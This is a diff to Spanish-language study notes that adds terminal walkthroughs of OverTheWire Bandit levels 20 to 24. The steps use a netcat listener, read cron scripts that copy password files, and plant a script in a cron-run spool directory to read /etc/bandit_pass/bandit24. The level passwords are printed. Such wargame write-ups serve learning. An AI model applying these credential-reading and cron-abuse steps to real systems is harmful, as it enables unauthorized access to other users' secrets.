@@ -193,8 +193,7 @@ Last login: Sun Jun  9 13:48:45 2024 from 192.168.120.100
 kali
 ```
 
-_*Nota*_: En algunas veces podemos hacer el proceso inverso de conectarnos a un servidor haciendo uso de la clave privada para lo que se usa `ssh -i ~/.ssh/id_rsa usuario@servidor_remoto
-`.
+_*Nota*_: En algunas veces podemos hacer el proceso inverso de conectarnos a un servidor haciendo uso de la clave privada para lo que se usa `ssh -i ~/.ssh/id_rsa usuario@servidor_remoto.
 
 ## scp
 
@@ -1030,4 +1029,137 @@ bash-5.2$ whoami
 bandit20
 bash-5.2$ cat /etc/bandit_pass/bandit20
 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+```
+
+#### bandit20 --> bandit21
+
+```bash
+bandit20@bandit:~$ ./suconnect 4646
+Read: 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+Password matches, sending next password
+```
+
+```bash
+bandit20@bandit:~$ nc -nlvp 4646
+Listening on 0.0.0.0 4646
+Connection received on 127.0.0.1 50026
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+```
+
+#### bandit21 --> bandit22
+
+```bash
+bandit21@bandit:~$ ls /etc/cron.d
+cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
+bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
+
+bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
+#!/bin/bash
+chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+```
+
+#### bandit22 --> bandit23
+
+```bash
+bandit22@bandit:/etc/cron.d$ ls
+cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  e2scrub_all  otw-tmp-dir  sysstat
+
+bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
+8ca319486bfbbc3663ea0fbe81326349
+
+bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+```
+
+#### bandit23 --> bandit24
+
+```bash
+bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+bandit23@bandit:~$ cd /var/spool/bandit24
+
+bandit23@bandit:/var/spool/bandit24$ ls -la
+total 12
+dr-xr-x--- 3 bandit24 bandit23 4096 Sep 19 07:08 .
+drwxr-xr-x 5 root     root     4096 Sep 19 07:08 ..
+drwxrwx-wx 6 root     bandit24 4096 Feb 18 08:53 foo
+
+bandit23@bandit:/var/spool/bandit24$ cat foo
+cat: foo: Permission denied
+
+bandit23@bandit:/var/spool/bandit24$ dir_name=$(mktemp -d)
+
+bandit23@bandit:/var/spool/bandit24$ echo $dir_name
+/tmp/tmp.UlDpaEPKxu
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ touch script.sh
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ chmod +x script.sh
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ ls -l
+total 0
+-rwxrwxr-x 1 bandit23 bandit23 0 Feb 18 09:01 script.sh
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ nano script.sh
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ cat script.sh
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.UlDpaEPKxu/bandit24_password.log
+chmod o+r /tmp/tmp.UlDpaEPKxu/bandit24_password.log
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ chmod o+wx $dir_name
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ ls -ld
+drwx----wx 2 bandit23 bandit23 4096 Feb 18 09:03 .
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ ls -ld /var/spool/bandit24/foo
+drwxrwx-wx 6 root bandit24 4096 Feb 18 09:11 /var/spool/bandit24/foo
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ cp script.sh /var/spool/bandit24/foo
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ ls
+bandit24_password.log  script.sh
+
+bandit23@bandit:/tmp/tmp.UlDpaEPKxu$ cat bandit24_password.log
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
 ```
